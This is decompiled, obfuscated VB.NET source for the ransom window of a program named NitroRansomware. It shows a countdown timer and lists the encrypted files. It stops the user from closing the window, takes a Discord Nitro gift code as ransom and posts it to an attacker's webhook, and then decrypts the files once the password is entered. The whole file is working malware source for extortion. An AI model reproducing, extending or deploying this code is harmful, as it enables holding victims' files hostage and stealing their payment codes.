Imports System
Imports System.ComponentModel
Imports System.Drawing
Imports System.Timers
Imports System.Windows.Forms
Imports dg3ypDAonQcOidMs0w
Imports rE4lpnT863QnijKQK5
Imports zlqCXdcKao7YZQAGFe

Namespace NitroRansomware
	' Token: 0x02000003 RID: 3
	Public Partial Class Form1
		Inherits Form

		' Token: 0x06000009 RID: 9 RVA: 0x00002250 File Offset: 0x00000450
		Public Sub New()
			hHEYokUTtehNq5ji0d.LQgF529zBT6Ox()
			Me.h = 3
			Me.m = 0
			Me.s = 0
			Me.ww = New Webhook(Program.WEBHOOK)
			Me.components = Nothing
			MyBase..ctor()
			Me.InitializeComponent()
		End Sub

		' Token: 0x0600000A RID: 10 RVA: 0x00002E0C File Offset: 0x0000100C
		Private Sub Form1_Load(sender As Object, e As EventArgs)
			Me.t = New System.Timers.Timer()
			Me.t.Interval = 1000.0
			AddHandler Me.t.Elapsed, AddressOf Me.OnTimeEvent
			Me.t.Start()
			Me.textBox5.Text = ""
			For Each text As String In Crypto.encryptedFileLog
				Dim textBox As TextBox = Me.textBox5
				textBox.Text = textBox.Text + WP6RZJql8gZrNhVA9v.L3hoFlcqP6(276) + text + WP6RZJql8gZrNhVA9v.L3hoFlcqP6(302)
			Next
		End Sub

		' Token: 0x0600000B RID: 11 RVA: 0x0000228F File Offset: 0x0000048F
		Private Sub Form1_FormClosing(sender As Object, e As FormClosingEventArgs)
			e.Cancel = e.CloseReason = CloseReason.UserClosing
		End Sub

		' Token: 0x0600000C RID: 12 RVA: 0x00002ED4 File Offset: 0x000010D4
		Private Sub button1_Click(sender As Object, e As EventArgs)
			If Me.NitroValid() Then
				Me.textBox3.Text = Crypto.fPassword
				Me.label7.Text = WP6RZJql8gZrNhVA9v.L3hoFlcqP6(310)
				Me.label7.ForeColor = Color.LightGreen
				Me.textBox4.Text = ""
				Me.label1.Text = ""
				Me.panel3.BackColor = Color.FromArgb(35, 39, 42)
				Me.textBox1.Text = WP6RZJql8gZrNhVA9v.L3hoFlcqP6(354)
				Me.t.[Stop]()
			End If
		End Sub

		' Token: 0x0600000D RID: 13 RVA: 0x00002F78 File Offset: 0x00001178
		Private Sub button2_Click(sender As Object, e As EventArgs)
			Dim text As String = Me.textBox4.Text
			If text = Crypto.fPassword Then
				Me.ww.Send(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(788))
				MessageBox.Show(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(922), WP6RZJql8gZrNhVA9v.L3hoFlcqP6(996), MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
				Crypto.inPassword = Crypto.fPassword
				Me.textBox5.Text = WP6RZJql8gZrNhVA9v.L3hoFlcqP6(1032)
				Cursor.Current = Cursors.WaitCursor
				Program.DecryptAll()
				Cursor.Current = Cursors.[Default]
				MessageBox.Show(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(1142), WP6RZJql8gZrNhVA9v.L3hoFlcqP6(996), MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
			Else
				MessageBox.Show(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(1626), WP6RZJql8gZrNhVA9v.L3hoFlcqP6(996), MessageBoxButtons.OK, MessageBoxIcon.Hand)
			End If
		End Sub

		' Token: 0x0600000E RID: 14 RVA: 0x000022A0 File Offset: 0x000004A0
		Private Sub textBox5_TextChanged(sender As Object, e As EventArgs)
		End Sub

		' Token: 0x0600000F RID: 15 RVA: 0x00003048 File Offset: 0x00001248
		Private Function NitroValid() As Boolean
			Dim webhook As Webhook = New Webhook(Program.WEBHOOK)
			Dim text As String = Me.textBox2.Text
			Dim text2 As String = String.Empty
			Console.WriteLine(text)
			If text.Contains(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(1652)) Then
				If text.Contains(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(1682)) Then
					Dim num As Integer = text.IndexOf(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(1702))
					text2 = text.Substring(num + 15)
					Console.WriteLine(text2)
				Else
					Dim num2 As Integer = text.IndexOf(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(1702))
					text2 = text.Substring(num2 + 1)
					MessageBox.Show(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(1708), WP6RZJql8gZrNhVA9v.L3hoFlcqP6(996), MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
				End If
				If Nitro.Check(text2) Then
					webhook.Send(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(1764))
					webhook.Send(text)
					MessageBox.Show(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(1834), WP6RZJql8gZrNhVA9v.L3hoFlcqP6(996), MessageBoxButtons.OK, MessageBoxIcon.Asterisk)
					Return True
				End If
				webhook.Send(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(2066))
				MessageBox.Show(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(2154), WP6RZJql8gZrNhVA9v.L3hoFlcqP6(996), MessageBoxButtons.OK, MessageBoxIcon.Hand)
			Else
				webhook.Send(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(2066))
				MessageBox.Show(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(2184), WP6RZJql8gZrNhVA9v.L3hoFlcqP6(996), MessageBoxButtons.OK, MessageBoxIcon.Hand)
			End If
			Return False
		End Function

		' Token: 0x06000010 RID: 16 RVA: 0x000022A2 File Offset: 0x000004A2
		Private Sub OnTimeEvent(sender As Object, e As ElapsedEventArgs)
			MyBase.Invoke(New Action(Sub()
				If Me.s < 1 Then
					Me.s = 59
					If Me.m = 0 Then
						Me.m = 59
						If Me.h <> 0 Then
							Me.h -= 1
						End If
					Else
						Me.m -= 1
					End If
				Else
					Me.s -= 1
				End If
				If Me.s <> 0 OrElse Me.m <> 0 OrElse Me.h <> 0 Then
				End If
				Me.label10.Text = String.Format(WP6RZJql8gZrNhVA9v.L3hoFlcqP6(3276), Me.h.ToString().PadLeft(2, "0"c), Me.m.ToString().PadLeft(2, "0"c), Me.s.ToString().PadLeft(2, "0"c))
			End Sub))
		End Sub

		' Token: 0x06000014 RID: 20 RVA: 0x0000223C File Offset: 0x0000043C
		' Note: this type is marked as 'beforefieldinit'.
		Shared Sub New()
			WP6RZJql8gZrNhVA9v.iXLoKRSpAw()
		End Sub

		' Token: 0x04000007 RID: 7
		Private t As System.Timers.Timer

		' Token: 0x04000008 RID: 8
		Private h As Integer

		' Token: 0x04000009 RID: 9
		Private m As Integer

		' Token: 0x0400000A RID: 10
		Private s As Integer

		' Token: 0x0400000B RID: 11
		Private ww As Webhook
	End Class
End Namespace
